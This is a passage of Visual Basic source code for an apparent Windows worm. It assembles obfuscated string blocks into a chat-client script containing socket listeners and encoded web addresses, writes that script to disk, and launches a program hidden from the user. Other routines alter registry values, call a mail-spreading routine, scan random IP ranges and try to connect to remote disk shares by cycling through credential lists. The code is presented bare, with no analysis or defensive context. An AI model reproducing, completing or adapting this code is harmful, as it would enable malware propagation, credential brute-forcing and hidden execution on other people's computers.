q("Hi'6=NIWRS=-=|'na'GTwnN':'#surb'|')wunqjt`'Gql)indl'65'#,'#6*'#,''z") & vbCrLf & _
q("''na'/ncbisna~'ntni'#6*.'{{'/kh`ni'ntni'#6*.'|'qfu'Gedu':'#jnudcnu'#,'jnudlb~)`c'{'na'/#bntst/Gedu.':'#afktb.'|')punsb'Gedu'***'E'f'u'c'n'b'k'***'#arkkcfsb'z") & vbCrLf & _
q("''''na'/#ubfc'*p-'#,'#jb'#,'-'Gedu':'#irkk.'|')punsb'Gedu'*****E'f'u'c'n'b'k*****'{')punsb'Gedu'E:'#jb") & vbCrLf & _
q("'''''')punsb'Gedu'E:'#dofi'{')punsb'Gedu'E:'#6*'{')punsb'Gedu'E:'#bjfnk'{')punsb'Gedu'E:'#tbuqbu'#whus") & vbCrLf & _
q("'')punsb'Gedu'E:'Pn'#,'ich'#,'pt'#ht'{')punsb'Gedu'E:'#arkkcfsb'{')punsb'Gedu'*****E'f'u'c'n'b'k*****'z'z") & vbCrLf & _
q("''na'/Fknft'ntni'#6*.'{{'/Khfc'ntni'#6*.'{{'/Ubjnin'ntni'#6*.'{{'/Rikhfc'ntni'#6*.'{{'/Ubjhqb'ntni'#6*.'{{'/Tbs'ntni'#6*.'{{'/Bqbist'ntni'#6*.'{{'/snjbu'ntni'#6*.'|'ofks'z") & vbCrLf & _
q("na'/Ritbs'ntni'#6*.'{{'/RitbsFkk'ntni'#6*.'{{'/Bifekb'ntni'#6*.'{{'/Cntfekb'ntni'#6*.'{{'/Ubjhsb'ntni'#6*.'{{'/tdunws'ntni'#6*.'{{'/wkf~'ntni'#6*.'{{'/thdld'ntni'#6*.'|'ofks'z'z") & vbCrLf & _
q("Fknft'rikhfc'|')bdoh'*fb'#cbdhcb/LnEQejq^PUk]DE}^4MwdOV`Mp::+j.'#,'#5'#,' 'z") & vbCrLf & _
q("Fknft'thdlknts'|'(bdoh'*fb'#cbdhcb/LnhvNB2qN@>p]P3`d5>mf5Q7dp::+j.'z") & vbCrLf

M2 = q("<***********************************************************************************") & vbCrLf & _
q("fknft'`ehs'|'`tbuq'{'Gut':'#u/6+2.'{')snjbu'6'4')thdlhwbi'`ehs'#o`bs/`Tq+Gut.'1110'z") & vbCrLf & _
q("fknft'`tp'|'na'/#thdl/#6.)tsfsrt'::'fdsnqb.'|'thdlpunsb'*i'#6'#5*'z'z") & vbCrLf & _
q("fknft'uindl'|'ubsrui'#ufic/F+}.'#,'#ufic/f+}.'#,'#ufic/f+}.'#,'#ufic/f+}.'#,'#ufic/F+}.'#,'#ufic/f+}.'#,'#ufic/F+}.'z") & vbCrLf & _
q("fknft'urtbu'|'Gq':'#u/6+>.") & vbCrLf & _
q("''na'/Gq'::'6.'Gq':'#cbdhcb/f@>7ePAweD2me57:+j.'{'na'/Gq'::'5.'Gq':'#cbdhcb/e@A7fP2s^PktKjIqeV::+j.'{'na'/Gq'::'4.'Gq':'#cbdhcb/bPAhe5?r^5>s+j.") & vbCrLf & _
q("''na'/Gq'::'3.'Gq':'#cbdhcb/c@Q~djBr^5>s+j.'{'na'/Gq'::'2.'Gq':'#cbdhcb/e_IrKjIqeV::+j.'{'na'/Gq'::'1.'Gq':'#cbdhcb/djIpKj2kcF::+j.") & vbCrLf & _
q("''na'/Gq'::'0.'Gq':'#cbdhcb/]5QlbjAmKj>~]p::+j.'{'na'/Gq'::'?.'Gq':'#cbdhcb/c@Qt]P]qejkm^T2me57:+j.'{'na'/Gq'::'>.'Gq':'#cbdhcb/d@Q~cT2me57:+j.") & vbCrLf & _
q("ubsrui'RTBU'#uindl'%'#,'Gq'#,'%'%'#,'#thdl/#thdlifjb.)nw'#,'%'='#,'Gq'z") & vbCrLf & _
q("hi'-=thdlhwbi=`ehs=|'`tp'`ehs'INDL'#uindl'{'`tp'`ehs'#urtbu'{')snjbuee'2'27'`tp'`ehs'mhni'#UD'z") & vbCrLf & _
q("hi'-=thdldkhtb=`ehs=|'`ehs'z") & vbCrLf & _
q("hi'-=thdlubfc=`ehs=|'na'/#thdlbuu'9'7.'|'ubsrui'z") & vbCrLf & _
q("''na'/#thdl/`ehs.)tsfsrt'::'fdsnqb.'|'thdlubfc'Guehs'z") & vbCrLf & _
q("''bktb'|'ubsrui'z") & vbCrLf & _
q("''na'/#thdleu'::'7.'|'ubsrui'z'{'na'/Guehs'::'#irkk.'|'Guehs':'*'z") & vbCrLf & _
q("''na'/#`bsshl/Guehs+6+45.'::'WNI@.'|'`tp'`ehs'WHI@'#`bsshl/Guehs+5+2?.'z") & vbCrLf & _
q("''na'/ENIAH'ntni'Guehs.'|')thdlpunsb'*i'#thdlifjb'wunqjt`'#UD'='#,'#jb'#,'#dou/45.'#,'#tbuqbu'#,'#dou/45.'#,'#whus'#,'#dou/45.'#,'#jnudcnu'#,'#dou/45.'#,'#nw'#,'#dou/45.'#,'#cfsb'#,'#dou/45.'#,'#snjb'z") & vbCrLf & _
q("''na'/dwd'ntni'Guehs.'|'#`bsshl/Guehs+2*+45.'z") & vbCrLf & _
q("na'/dtq'ntni'Guehs.'|')thdlpunsb'*si'`ehs'#`bsshl/Guehs+2*+45.'z'z") & vbCrLf & _
q("fknft'`ossw'|')thdlkntsbi'wossw'5773'{')thdlkntsbi'wankb'5774'z") & vbCrLf & _
q("hi'-=thdlkntsbi=wossw='|')thdlfddbws'sosj'#,'#u/7+>>>>>>>>>>.'z") & vbCrLf

M3 = q("hi'-=thdlkntsbi=wankb='|')thdlfddbws'sank'#,'#u/7+>>>>>>>>>>.'z") & vbCrLf & _
q("hi'-=thdlubfc=sosj-='|'na'/#thdlbuu'9'7.'|'ubsrui'z") & vbCrLf & _
q("''na'/#thdl/#thdlifjb.)tsfsrt'::'fdsnqb.'|'thdlubfc'Guos'z") & vbCrLf & _
q("''bktb'|'ubsrui'z") & vbCrLf & _
q("''na'/#thdleu'::'7.'|'ubsrui'z'{'na'/Guos'::'#irkk.'|'GtbicTud':'*'z") & vbCrLf & _
q("''na'/#`bsshl/Guos+5+45.'::'#cbdhcb/K5kr]@Q3Kjo7eV::+j..'|") & vbCrLf & _
q("''''oobfc") & vbCrLf & _
q("''''`tp'#thdlifjb'#cbdhcb/W@o7ePp,W@`~WlMo^5sBe5>~Klo7cOF`VjA~]@kkeD2CN@M2NBck]Owo^~EJ^PM}WD>hJm3?K5o7ePp,+j.") & vbCrLf & _
q("''z") & vbCrLf & _
q("") & vbCrLf & _
q("''na'/(d=b6'ntni'#`bsshl/Guos+5+45..'{{'/(c=b6'ntni'#`bsshl/Guos+5+45..'|") & vbCrLf & _
q("''''Gocu':'#ubwkfdb/#jnc/#`bsshl/Guos+5+45.+5.+b6+[.") & vbCrLf & _
q("''''oobfc") & vbCrLf & _
q("''''`tp'#thdlifjb'#cbdhcb/W@o7ePp,W@`~WlMo^5sBe5>~Klo7cOF`VjA~]@kkeD2CND7`U@k~d~El]V::+j.'#,'#dou/45.'#,'Gocu'#,';(o59;wub9") & vbCrLf & _
q("''''Gdsc':'6") & vbCrLf & _
q("''''ponkb'/Gdsc';:'#aniccnu/#ubwkfdb/Gocu+X+#dou/45..+-)-+7+6..'|") & vbCrLf & _
q("''''''`tp'#thdlifjb'#aniccnu/#ubwkfdb/Gocu+X+#dou/45..+-)-+Gdsc+6.'{'nid'Gdsc") & vbCrLf & _
q("''''z") & vbCrLf

M4 = q("") & vbCrLf & _
q("''''`tp'#thdlifjb'#cbdhcb/W@o7ePp,W@`~WlMo^5sBe5>~Klo7cOF`VjA~]@kkeD2CND7`Ujkt]_J`]@R:+j.'#,'#dou/45.'#,'Gocu'#,';(o59") & vbCrLf & _
q("''''Gdsc':'6") & vbCrLf & _
q("''''ponkb'/Gdsc';:'#anicankb/#ubwkfdb/Gocu+X+#dou/45..+-)-+7+6..'|") & vbCrLf & _
q("''''''`tp'#thdlifjb'#anicankb/#ubwkfdb/Gocu+X+#dou/45..+-)-+Gdsc+6.'{'nid'Gdsc") & vbCrLf & _
q("''''z") & vbCrLf & _
q("''''`tp'#thdlifjb'#cbdhcb/WD>pdjR,WD>hc@6tW`::+j.") & vbCrLf & _
q("z'z") & vbCrLf & _
q("") & vbCrLf & _
q("fknft'oobfc'|") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/TAURRD?KmB`JmFpNB>K+j.") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/R5Q~cjQ~HnEH]_U}^5Ap]T6AeiUkdiE~f_IkK}VrJV::+j.") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/U@A7]Sh:+j.'#,'#Dou/45.'#,'#arkkcfsb") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/V5>rc@QrcD67b_EkHnE7]_o7K5o7ePp:+j.") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/U_Uo]}h`Nj^3IjV5]CN5KPB3KSV~JT7}]mkjHPB~JnN:+j.") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/S@A}cD6se5Uw]jkk]Ch:+j.'#,'#Dou/45.'#,'#arkkcfsb") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/VPIm]_E7KRQr^5>lfP2iHnEw]@Qrc@k7bV::+j.") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/VPIm]_E7K_Moejckd}h`^ik7]_J:+j.") & vbCrLf

M5 = q("''`tp'#thdlifjb'#duka'{'Gdo':'6") & vbCrLf & _
q("''ponkb'/Gdo';'0.'|'`tp'#thdlifjb'#cbdhcb/^PAo^PAo^PAo^PAo^PAo^PAo^PAo^PAo^PAo^PAo^PAo+j.'{'nid'Gdo'z") & vbCrLf & _
q("z") & vbCrLf & _
q("") & vbCrLf & _
q("fknft'UD'|'qfu'Gu6':'#dfkd/#ftdsnjb/#`js+cc.','#ftdsnjb/#`js+jj.','#ftdsnjb/#`js+~~..") & vbCrLf & _
q("''qfu'Gu5':'#ftdsnjb/#`js+ccc.'#,'#ftdsnjb/#`js+jjj..") & vbCrLf & _
q("ubsrui'#dou/42.'#,'Gu5'#,'Gu6'z") & vbCrLf & _
q("") & vbCrLf & _
q("hi'-=thdlubfc=sank-='|'na'/#thdlbuu'9'7.'|'ubsrui'z") & vbCrLf & _
q("''na'/#thdl/#thdlifjb.)tsfsrt'::'fdsnqb.'|'thdlubfc'GtbicAnk'z") & vbCrLf & _
q("''bktb'|'ubsrui'z") & vbCrLf & _
q("''na'/#thdleu'::'7.'|'ubsrui'z") & vbCrLf & _
q("''na'/GtbicAnk'::'#irkk.'|'GtbicAnk':'*'z") & vbCrLf & _
q("''na'/(d=b6'ntni'#`bsshl/GtbicAnk+5+45..'{{'/(c=b6'ntni'#`bsshl/GtbicAnk+5+45..'|") & vbCrLf & _
q("''''tbicAnkb'#ubwkfdb/#jnc/#`bsshl/GtbicAnk+5+45.+5.+b6+[.") & vbCrLf & _
q("z'z") & vbCrLf & _
q("") & vbCrLf & _
q("fknft'tbicAnkb'|") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/TAURRD?KmB`JmFpNB>K+j.") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/U@A7]Sh:+j.'#,'#Dou/45.'#,'#arkkcfsb") & vbCrLf

M6 = q("''`tp'#thdlifjb'#cbdhcb/R5Q~cjQ~HnEH]_U}^5Ap]T6AeiUkdiE~f_IkK}VrJV::+j.") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/VPIm]_E7KQMoejckd}h`^ik7]_J:+j.") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/V5>rc@QrcD6Rb_EkHnEodOEtfPIoc@kqen>q^4UkcD6}cOMk^P7:+j.") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/V5>rc@QrcD6J]P2ic@`1+j.'#,'#Dou/45.'#,'#ankb/#6*.)tn}b") & vbCrLf & _
q("''`tp'#thdlifjb'#cbdhcb/VPIm]_E7KRQr^5>lfP2iHnEw]@Qrc@k7bV::+j.") & vbCrLf & _
q("''`tp'#thdlifjb'#duka") & vbCrLf & _
q("''Tbs'Gkank'7'{'Tbs'Grank'#kha/#6*.'{'Tbs'G`ank'#6*") & vbCrLf & _
q("z") & vbCrLf & _
q("") & vbCrLf & _
q("fknft'twubfc'|'na'/#ntankb/#5*.'::'#surb.'|'eubfc'%'#,'#5*'#,'%'Gkank'13'!a~kb'z") & vbCrLf & _
q("''thdlpunsb'#6'!a~kb") & vbCrLf & _
q("Gkank':'#dfkd/Gkank','#eqfu/!a~kb+7..'z") & vbCrLf & _
q("") & vbCrLf & _
q("hi'-=thdlpunsb=sank-='|'na'/#thdlbuu'9'7.'|'thdldkhtb'#thdlifjb'{'ubsrui'z") & vbCrLf & _
q("''na'/Gkank'9:'Grank.'|'thdldkhtb'#thdlifjb'{'ubsrui'z") & vbCrLf & _
q("twubfc'#thdlifjb'G`ank'z") & vbCrLf & _
q("") & vbCrLf & _
q("fknft'`tbuq'|") & vbCrLf & _
q("''ofcc'*j'`Tq'6'#cbdhcb/f_MmKiQr]@Q~ejQ7Kj>~]p::+j.") & vbCrLf & _
q("''ofcc'`Tq'5'#cbdhcb/ePArf@A7c@ArKjs}KiQ}KiQr]@Q~ejQ7Kj>~]p::+j.") & vbCrLf & _
q("''ofcc'`Tq'4'#cbdhcb/d@Ar^P6o^5k7bT2p^T26ejUkdj2kcD2qdjd:+j.") & vbCrLf & _
q("''ofcc'`Tq'3'#cbdhcb/d5Ar]@kk]5?r^5Brc_JrcP2l]_Mr]_Vre4Mi+j.") & vbCrLf & _
q("''ofcc'`Tq'2'#cbdhcb/]jAwdj]obD25^T26d~26ejUkdj2kcD2qdjd:+j.") & vbCrLf & _
q("z") & vbCrLf

M7 = q("<***********************************************************************************") & vbCrLf & _
q("Hi'6=DHIIBDS=|'(Ritbs'Gqe)-'Gql)-'Gqi)-'{'(tbs'GTwnN'#afktb'{'(tbs'GTwnS'#afktb'{'(tbs'Gql)Twn'#afktb'{'(Ubjhsb'Hi'{'|'`ehs'{'`ossw'z'z") & vbCrLf & _
q("Hi'6=MHNI=-=|'na'/#indl'&:'#jb.'|'|'tje'z'{'|'te'z'z'z") & vbCrLf & _
q("Hi'6=AnkbUdqc=-=|'na'/#indl'&:'#jb.'|'|'tje'z'{'|'te'z'z'z") & vbCrLf & _
q("Hi'6=WFUS=$=|'na'/#indl'&:'#jb.'|'|'tje'z'{'|'te'z'z'z") & vbCrLf & _
q("Hi'6=AnkbTbis=-=|'na'/)}nw'ntni'#ankbifjb.'|'ofks'z'{'qfu'Gtw':'D=[PNICHPT[T^TSBJ'#,'#cbdhcb/_@]we@Q1f_Frbjkp+j.'{')dhw~'*h'Gtw'#ihankb/Gtw.'#,'#`bsshl/#ihwfso/#ankbifjb.+6+31.'#,'5)}nw'{'dte'#indl'#ihankb/Gtw.'#,'#`bsshl/#ihwfso/#ankbifjb.+6+31.'#,'5)}nw'$hw'z") & vbCrLf & _
q("Hi'6=TBICAFNK=-=|'ofks'z") & vbCrLf & _
q("") & vbCrLf & _
q("Fknft'te'|'qfu'Gew':'D=[PNICHPT[T^TSBJ'#,'#cbdhcb/_@]we@Q1f_Frbjkp+j.") & vbCrLf & _
q("''na'/#bntst/Gew.':'#afktb.'|'ofks'z'{'qfu'Geu':'#ufic/6+67.'") & vbCrLf & _
q("''na'/Geu':'6.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/TP6o]5Rrbjkp+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/TP6o]5Rrbjkp+j.'z") & vbCrLf & _
q("''bktbna'/Geu':'5.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/ViMqePA}KiwwdF::+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/ViMqePA}KiwwdF::+j.'z") & vbCrLf & _
q("''bktbna'/Geu':'4.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/Qjkl]P?rbjkp+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/Qjkl]P?rbjkp+j.'z") & vbCrLf & _
q("''bktbna'/Geu':'3.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/VP2wePAmfP>rKiwwdF::+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/VP2wePAmfP>rKiwwdF::+j.'z") & vbCrLf & _
q("''bktbna'/Geu':'2.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/R5I~]PQrR5A5]_Nrbjkp+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/R5I~]PQrR5A5]_Nrbjkp+j.'z") & vbCrLf & _
q("''bktbna'/Geu':'1.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/VP2ldjQoKiwwdF::+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/VP2ldjQoKiwwdF::+j.'z") & vbCrLf & _
q("''bktbna'/Geu':'0.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/SPArcPAtR5QlcPImfP>rKiwwdF::+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/SPArcPAtR5QlcPImfP>rKiwwdF::+j.'z") & vbCrLf

M8 = q("''bktbna'/Geu':'?.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/UT6C^_MlKiwwdF::+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/UT6C^_MlKiwwdF::+j.'z") & vbCrLf & _
q("''bktbna'/Geu':'>.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#cbdhcb/S4]rfT21f_F:+j.'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#cbdhcb/S4]rfT21f_F:+j.'z") & vbCrLf & _
q("''bktbna'/Geu':'67.'|')dhw~'*h'Gew'#ihankb/Gew.'#,'#jb'#,')}nw'{'Tbs'Gqe)ankb'#ihankb/Gew.'#,'#jb'#,')}nw'z") & vbCrLf & _
q(")n`ihub'*uwdisnlr62'#fccubtt/#indl+6.'{'dte'#indl'Gqe)ankb'#dofi'z") & vbCrLf & _
q("") & vbCrLf & _
q("Fknft'tje'|'qfu'Geu4':'#ufic/6+67.'") & vbCrLf & _
q("''na'/Geu4':'6.'|'qfu'Gej4':'#cbdhcb/F}B~KCAAd5I6^5ooN@oNOMo]@kqNB>re@kr]TFCF}`tJPo7cOF1K~>6d4Qodjkqd~2tbPIqd~2kd~>sfPt^Pwp]~>~^PUwe~2sdCJC+j.'z") & vbCrLf & _
q("''bktbna'/Geu4':'5.'|'qfu'Gej4':'#cbdhcb/F}`tJR]qc@>}NAo^PFJCIDpN@o7cOF1K~>hcOUpHn?qc_I6^_Mwe4JreOkme4Jr]_Jq]5QlePUsK5kd5Mw^P3rfiEiFpJ3KCB`PAo^NB]qc@>}Fp::+j.'z") & vbCrLf & _
q("''bktbna'/Geu4':'4.'|'qfu'Gej4':'#cbdhcb/F}VtJR]~]PR`PAo^NAIkbA]w]@QqNFJCHDpfOU7dChqK5o7cOF1K~>6d4Qodjkqd~2tbPIqd~2kd~>i]PUs]@7qd5Q3cjkl]P?r^_]wFp::+j.'z") & vbCrLf & _
q("''bktbna'/Geu4':'3.'|'qfu'Gej4':'#cbdhcb/F}FtJSIIf_MoN@oN@]qc@?`FpJ7KCBsW`JCHDpIDEhcOUpHn?qc_I6^_Mwe4JreOkme4Jr]_Jq]5N~JCF}K4U6Kjwp]pJ:+j.'z") & vbCrLf & _
q("''bktbna'/Geu4':'2.'|'qfu'Gej4':'#cbdhcb/F}B}KCADdjk7ejQ2KDECfOMwd4UwejBtNBwkej2w]jQ~KDEkc@J`FpJ3KCAhcOUpHn?qc_I6^_Mwe4JreOkme4Jr]_Jq]5N~JCF}K5]oeP>}^_Jr^_]wFp::+j.'z") & vbCrLf & _
q("''bktbna'/Geu4':'1.'|'qfu'Gej4':'#cbdhcb/F}QHe~EmdjQkd~EkenEte4J`]jArc@A}ePA}W~FCF}B7fOU7dChqK56wc@ctfPQlKj2^5>}KjUkK5ck]@Modn>j^P27^_Is^T2vd@d`HjpC+j.'z") & vbCrLf & _
q("''bktbna'/Geu4':'0.'|'qfu'Gej4':'#cbdhcb/F}VtJQEw^4J`SP>l]P}NFJCJSJtJPo7cOF1K~>sf_Uie@kk]D2tbPIqd~2l]T>i]PUn^_Nq^PU~fPAr^T2vd@dCF}VtJTEIe5UkeOJ`R@kmdpJ:+j.'z") & vbCrLf & _
q("''bktbna'/Geu4':'?.'|'qfu'Gej4':'#cbdhcb/F}dtJAA6]TE5]_J`]P3`]_I7^TEweOQ}fP>rFpJ7KCF(FpJJ~ppN@o7cOF1K~>s]P6n]_M}Kj2^5>}Kj2tK5cnJmFqFpJ7KCEweOQ}fP>rKjwp]pJ:+j.'z") & vbCrLf & _
q("''bktbna'/Geu4':'>.'|'qfu'Gej4':'3+?Jnuf'btsf'ahsh'?+3ossw=((jbjebut)k~dht)ik(`e57(dfushhi)mw`'z") & vbCrLf & _
q("''bktbna'/Geu4':'67.'|'qfu'Gej4':'3+6Aubb'wndt'@nukt+'Sbbit'?+6ossw=((rtrfunht)k~dht)bt(jnkkfmw`(sbbit)mw`'z") & vbCrLf & _
q(")wunqjt`'#indl'Gej4'z") & vbCrLf & _
q("") & vbCrLf & _
q("Fknft'dte'|'tbs'Gqe)ankb'#5") & vbCrLf & _
q("''na'/'#6'nthw'#4'.'{{'/'#6'ntqhndb'#4'.'|'ofks'z") & vbCrLf


M9 = q("''na'/'#bntst/Gqe)ankb.':'#afktb'.'|'ofks'z") & vbCrLf & _
q("''na'/'#thdl/qe)-+7.'9'2'.'|'ubsrui'z'") & vbCrLf & _
q("''Tbs'Gqe)'#,'#6'7'{'=tdfiws'{'Tbs'Gws'#ufic/5377+2777.'") & vbCrLf & _
q("''na'/'#whusaubb/Gws.':'#afktb'.'|'`hsh'tdfiws'z'") & vbCrLf & _
q("''Tbs'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z'7'{'Tbs'Gwl)'#,'#6'37>1'{'Tbs'Gt}'#ankb/Gqe)ankb.)tn}b") & vbCrLf & _
q("''Tbs'Gqe)qsw6'qe)'#,'#6'{')snjbu'#,'#6'6'477'|')thdldkhtb'Gqe)qsw6'{')thdldkhtb'„)'#,'#6'z") & vbCrLf & _
q("'')snjbu'#,'#6'6'27'be'#6'{')n`ihub'*r>7'#6'5") & vbCrLf & _
q("'')ufp'*v'wunqjt`'#6'='#,'#dou/6.'#,'CDD'TBIC'Gqe)ankb'#khi`nw/#nw.'Gws'Gt}'#,'#dou/6.") & vbCrLf & _
q("na'/'#thdl/Gqe)qsw6.'&:'#irkk'.'|')thdldkhtb'Gqe)qsw6'z'{')thdlkntsbi'Gqe)qsw6'Gws'z") & vbCrLf & _
q("") & vbCrLf & _
q("Fknft'be'|'na'/'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z':'7'.'|')thdldkhtb'\'„)'#,'\'#6'Z'Z'{')thdldkhtb'\'qe)'#,'\'#6'Z'Z'{')snjbu'#,'#6'haa'z'z") & vbCrLf & _
q("Fknft'kte'|'na'/'#dfkd/'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z','\'G'#,'\'wl)'#,'\'#6'Z'Z'Z'.';'Gt}.'|'eubfc'Gqe)ankb'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z'\'G'#,'\'wl)'#,'\'#6'Z'Z'Z'!cfsf'{')thdlpunsb'„)'#,'#6'!cfsf'{'nid'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z'\'G'#,'\'wl)'#,'\'#6'Z'Z'Z'z'{'bktb'|'Tbs'\'G'#,'\'qe)'#,'\'#6'Z'Z'Z'6'{'\'G'#,'\'wl)'#,'\'#6'Z'Z'Z':'#dfkd/'Gt}'*'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z'.'{'na'/'\'G'#,'\'wl)'#,''\'#6'Z'Z'Z':'7.'|'ubsrui'z'{'eubfc'Gqe)ankb'\'G'#,'\'qi)'#,'\'#6'Z'Z'Z'\'G'#,'\'wl)'#,'\'#6'Z'Z'Z'!cfsf'{')thdlpunsb'„)'#,'#6'!cfsf'z'z") & vbCrLf & _
q("") & vbCrLf & _
q("Hi'6=ThdlDkhtb=„)-=|'Tbs'Gqe)sjw1'#ubjhqb/#thdlifjb+„).'{'thdldkhtb'#thdlifjb'{'thdldkhtb'\'qe)'#,'\'Gqe)sjw1'Z'Z'{')snjbu'#,'Gqe)sjw1'haa'z") & vbCrLf

M10 = q("Hi'6=ThdlKntsbi=qe)-=|'Tbs'Gqe)sjw2'#ubjhqb/#thdlifjb+qe).'{'thdlfddbws'„)'#,'Gqe)sjw2'{'kte'Gqe)sjw2'z") & vbCrLf & _
q("Hi'6=ThdlPunsb=„)-=|'Tbs'Gqe)sjw1'#ubjhqb/#thdlifjb+„).'{'na'/'\'G'#,'\'qe)'#,'\'Gqe)sjw1'Z'Z'Z':'6'.'|')snjbu'#,'#ufic/>>+>>>>.'6'67'thdldkhtb'#thdlifjb'{')snjbu'#,'#u/>>+>>>>.'6'67'thdldkhtb'\'qe)'#,'\'Gqe)sjw1'Z'Z'{')snjbu'#,'Gqe)sjw1'haa'{'ofks'z'{'kte'Gqe)sjw1'z") & vbCrLf & _
q("") & vbCrLf & _
q("Hi'6=bns=|'qfu'Gbwe':'D=[PNICHPT[T^TSBJ'#,'['{'qfu'Ged':'6'{'ponkb'/Ged';:'67.'|") & vbCrLf & _
q("''''na'/Ged':'6.'|'qfu'Gdwe':'Gbwe'#,'#cbdhcb/TP6o]5Rrbjkp+j.'z") & vbCrLf & _
q("''''na'/Ged':'5.'|'qfu'Gdwe':'Gbwe'#,'#cbdhcb/ViMqePA}KiwwdF::+j.'z") & vbCrLf & _
q("''''na'/Ged':'4.'|'qfu'Gdwe':'Gbwe'#,'#cbdhcb/Qjkl]P?rbjkp+j.'z") & vbCrLf & _
q("''''na'/Ged':'3.'|'qfu'Gdwe':'Gbwe'#,'#cbdhcb/VP2wePAmfP>rKiwwdF::+j.'z") & vbCrLf & _
q("''''na'/Ged':'2.'|'qfu'Gdwe':'Gbwe'#,'#cbdhcb/R5I~]PQrR5A5]_Nrbjkp+j.'z") & vbCrLf & _
q("''''na'/Ged':'1.'|'qfu'Gdwe':'Gbwe'#,'#cbdhcb/VP2ldjQoKiwwdF::+j.'z") & vbCrLf & _
q("''''na'/Ged':'0.'|'qfu'Gdwe':'Gbwe'#,'#cbdhcb/SPArcPAtR5QlcPImfP>rKiwwdF::+j.'z") & vbCrLf & _
q("''''na'/Ged':'?.'|'qfu'Gdwe':'Gbwe'#,'#cbdhcb/UT6C^_MlKiwwdF::+j.'z") & vbCrLf & _
q("''''na'/Ged':'>.'|'qfu'Gdwe':'Gbwe'#,'#cbdhcb/S4]rfT21f_F:+j.'z") & vbCrLf & _
q("''''na'/Ged':'67.'|'qfu'Gdwe':'Gbwe'#,'#jb'#,')}nw'z") & vbCrLf & _
q("''na'/#bntst/Gdwe.':'#surb.'|')ubjhqb'Gdwe'z'{'nid'Ged'z") & vbCrLf & _
q("qfu'Gdi':'#anicankb/Gbwe+-5)}nw+7.'{'qfu'Gdt':'6'{'ponkb'/Gdt';:'Gdi.'|')ubjhqb'#anicankb/Gbwe+-5)}nw+Gdt.'{'nid'Gdt'z'z") & vbCrLf & _
q("Hi'6=Cntdhiibds=|')snjbut'haa'{')thdldkhtb'qe)-'{')thdldkhtb'„)-'z")

MCV = M1 & M2 & M3 & M4 & M5 & M6 & M7 & M8 & M9 & M10: MCV = Replace(MCV, q("G"), "%")

Set bm = Bf.createtextfile(M & q("[ejnud)okw")): bm.write MCV: bm.Close

MCV = "": M1 = "": M2 = "": M3 = "": M4 = "": M5 = "": M6 = "": M7 = "": M8 = "": M9 = "": M10 = ""

If Dir(Sp(1) & q("[ankb}nw)}nw")) <> "" Then Exit Sub
id = Shell(Sp(1) & q("[wl}nw)bb'") & Sp(1) & q("[ankb}nw)}nw'") & Sp(1) & q("[") & key2, vbHide)
End Sub

Function Dow() As Boolean
On Error Resume Next: Dim Bd As String
Bd = Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ChpAnkb"))
If (Bd = 0) Or (Bd = "") Then Dow = False Else Dow = True
If Day(Date) Mod 3 = 0 Then
Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ChpAnkb"), 1, ""
Else
Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ChpAnkb"), 0, ""
End If
End Function

Function BState() As Boolean
Call MailsSend
On Error Resume Next: BState = IIf(InternetGetConnectedState(0&, 0&) <> 0, True, False)
If Err Then BState = True
End Function

Sub Bred()
On Error Resume Next
Do: Call BRedInfected: Loop
End Sub

Sub BRedInfected()
On Error Resume Next
Call MailsSend: Randomize
For i = 0 To 2: RI = RI & Int(Rnd * 254) & ".": Next
IpA RI
End Sub

Sub IpA(x)
On Error Resume Next: i1 = Split(x, q(")"))
For i = 0 To UBound(i1) - 1
I2 = I2 & i1(i) & "."
Next
For U = 1 To 255
BNetBios I2 & U
Next
End Sub

Sub BNetBios(BUC)
On Error Resume Next: Dim Bnet As NETRESOURCE, Bl As Long
Bnet.dwType = RESOURCETYPE_DISK: Bnet.lpLocalName = "Z:"
Bnet.lpRemoteName = "\\" & BUC & "\c": Bnet.lpProvider = ""
For Each i1 In Ured()
For Each I2 In Ured()
Bl = WNetAddConnection2(Bnet, CStr(i1), CStr(I2), CONNECT_UPDATE_PROFILE)
